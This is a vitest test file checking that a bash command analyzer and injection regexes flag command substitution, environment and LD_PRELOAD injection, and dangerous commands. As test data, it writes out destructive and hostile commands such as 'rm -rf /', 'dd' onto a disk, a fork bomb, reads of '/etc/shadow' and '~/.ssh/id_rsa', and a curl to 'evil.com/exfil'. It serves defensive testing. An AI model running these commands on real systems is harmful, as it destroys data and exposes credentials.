/**
 * P9 Command Execution Security Hardening — Attack Path Tests
 *
 * Covers:
 * - COMMAND_INJECTION_RE: $(), backtick, process substitution, null bytes
 * - Environment variable injection: env VAR=val cmd
 * - BashCommandAnalyzer: process substitution <() and >()
 * - BashCommandAnalyzer: null byte detection
 * - Command chain operator combinations
 */
import { describe, it, expect } from "vitest"
import { analyzeBashCommand } from "../BashCommandAnalyzer"

// ─── Command Injection (COMMAND_INJECTION_RE parity) ─────────────────────────

/** Mirror the injection regex used in tool-executors.ts for unit testing. */
const COMMAND_INJECTION_RE = /\$\(|`|<\(|>\(|\0/

describe("COMMAND_INJECTION_RE — hard injection guard", () => {
	it("rejects $(...) command substitution", () => {
		expect(COMMAND_INJECTION_RE.test("echo $(whoami)")).toBe(true)
	})

	it("rejects backtick substitution", () => {
		expect(COMMAND_INJECTION_RE.test("echo `id`")).toBe(true)
	})

	it("rejects <() process substitution", () => {
		expect(COMMAND_INJECTION_RE.test("diff <(cat a) <(cat b)")).toBe(true)
	})

	it("rejects >() process substitution", () => {
		expect(COMMAND_INJECTION_RE.test("tee >(grep error)")).toBe(true)
	})

	it("rejects null byte injection", () => {
		expect(COMMAND_INJECTION_RE.test("echo hello\0world")).toBe(true)
	})

	it("passes clean single command", () => {
		expect(COMMAND_INJECTION_RE.test("ls -la")).toBe(false)
	})

	it("passes command with parentheses in args (not process sub)", () => {
		// `(a b c)` without < or > prefix is array syntax, not process sub
		expect(COMMAND_INJECTION_RE.test("echo (hello)")).toBe(false)
	})

	it("passes grep with regex pattern", () => {
		expect(COMMAND_INJECTION_RE.test('grep -E "foo|bar" file.txt')).toBe(false)
	})
})

// ─── Environment Variable Injection ──────────────────────────────────────────

/** Mirror the env injection regex used in tool-executors.ts. */
const ENV_INJECTION_RE = /^\s*env\s+[A-Za-z_][A-Za-z0-9_]*=/

describe("env injection guard", () => {
	it("rejects env PATH=/evil cmd", () => {
		expect(ENV_INJECTION_RE.test("env PATH=/evil ls")).toBe(true)
	})

	it("rejects env LD_PRELOAD=/lib/evil.so cmd", () => {
		expect(ENV_INJECTION_RE.test("env LD_PRELOAD=/lib/evil.so ls")).toBe(true)
	})

	it("rejects env with multiple variables", () => {
		expect(ENV_INJECTION_RE.test("env FOO=bar BAZ=qux ls")).toBe(true)
	})

	it("rejects env with leading whitespace", () => {
		expect(ENV_INJECTION_RE.test("  env FOO=bar ls")).toBe(true)
	})

	it("passes plain env (no variable assignment)", () => {
		expect(ENV_INJECTION_RE.test("env")).toBe(false)
	})

	it("passes env command with --unset flag (no VAR=val)", () => {
		expect(ENV_INJECTION_RE.test("env --unset=FOO ls")).toBe(false)
	})

	it("passes echo with env in string", () => {
		expect(ENV_INJECTION_RE.test("echo env PATH=/test")).toBe(false)
	})
})

// ─── BashCommandAnalyzer — process substitution & null bytes ─────────────────

describe("analyzeBashCommand — P9 new patterns", () => {
	it("detects <() process substitution as medium risk", () => {
		const result = analyzeBashCommand("diff <(cat file1) <(cat file2)")
		expect(result.reasons.some((r) => r.includes("Process substitution"))).toBe(true)
	})

	it("detects >() process substitution as medium risk", () => {
		const result = analyzeBashCommand("tee >(grep error) < output.txt")
		expect(result.reasons.some((r) => r.includes("Process substitution"))).toBe(true)
	})

	it("detects null byte in command", () => {
		const result = analyzeBashCommand("echo hello\0injected")
		expect(result.reasons.some((r) => r.includes("Null byte"))).toBe(true)
	})

	it("still detects $() substitution", () => {
		const result = analyzeBashCommand("echo $(cat /etc/passwd)")
		expect(result.reasons.some((r) => r.includes("Command substitution"))).toBe(true)
	})

	it("still detects backtick substitution", () => {
		const result = analyzeBashCommand("echo `whoami`")
		expect(result.reasons.some((r) => r.includes("Backtick"))).toBe(true)
	})
})

// ─── BashCommandAnalyzer — comprehensive dangerous command coverage ──────────

describe("analyzeBashCommand — dangerous command attack paths", () => {
	it("forbids rm -rf /", () => {
		const result = analyzeBashCommand("rm -rf /")
		expect(result.riskLevel).toBe("forbidden")
	})

	it("forbids mkfs", () => {
		const result = analyzeBashCommand("mkfs.ext4 /dev/sda")
		expect(result.riskLevel).toBe("forbidden")
	})

	it("forbids fork bomb", () => {
		const result = analyzeBashCommand(":(){ :|:& };:")
		expect(result.riskLevel).toBe("forbidden")
	})

	it("forbids dd with if/of", () => {
		const result = analyzeBashCommand("dd if=/dev/zero of=/dev/sda")
		expect(result.riskLevel).toBe("forbidden")
	})

	it("detects sudo privilege escalation", () => {
		const result = analyzeBashCommand("sudo cat /etc/shadow")
		expect(result.reasons.some((r) => r.includes("PRIVILEGE") || r.includes("FORBIDDEN"))).toBe(true)
	})

	it("detects sensitive file access /etc/passwd", () => {
		const result = analyzeBashCommand("cat /etc/passwd")
		expect(result.reasons.some((r) => r.includes("SENSITIVE"))).toBe(true)
	})

	it("detects sensitive file access ~/.ssh/", () => {
		const result = analyzeBashCommand("cat ~/.ssh/id_rsa")
		expect(result.reasons.some((r) => r.includes("SENSITIVE") || r.includes("DANGEROUS"))).toBe(true)
	})

	it("detects git push --force as dangerous", () => {
		const result = analyzeBashCommand("git push origin main --force")
		expect(result.reasons.some((r) => r.includes("DANGEROUS"))).toBe(true)
	})

	it("detects eval as command substitution", () => {
		const result = analyzeBashCommand("eval 'rm -rf /'")
		expect(result.reasons.some((r) => r.includes("SUBSHELL") || r.includes("eval"))).toBe(true)
	})

	it("detects network operation curl", () => {
		const result = analyzeBashCommand("curl http://evil.com/exfil")
		expect(result.reasons.some((r) => r.includes("NETWORK"))).toBe(true)
	})

	it("flags rm as dangerous", () => {
		const result = analyzeBashCommand("rm -rf build/")
		expect(result.reasons.some((r) => r.includes("DANGEROUS"))).toBe(true)
	})

	it("flags chmod 777 as dangerous", () => {
		const result = analyzeBashCommand("chmod 777 /var/www")
		expect(result.reasons.some((r) => r.includes("DANGEROUS"))).toBe(true)
	})

	it("safe command has safe risk level", () => {
		const result = analyzeBashCommand("ls -la")
		expect(result.riskLevel).toBe("safe")
	})

	it("safe command echo is safe", () => {
		const result = analyzeBashCommand("echo hello world")
		expect(result.riskLevel).toBe("safe")
	})
})
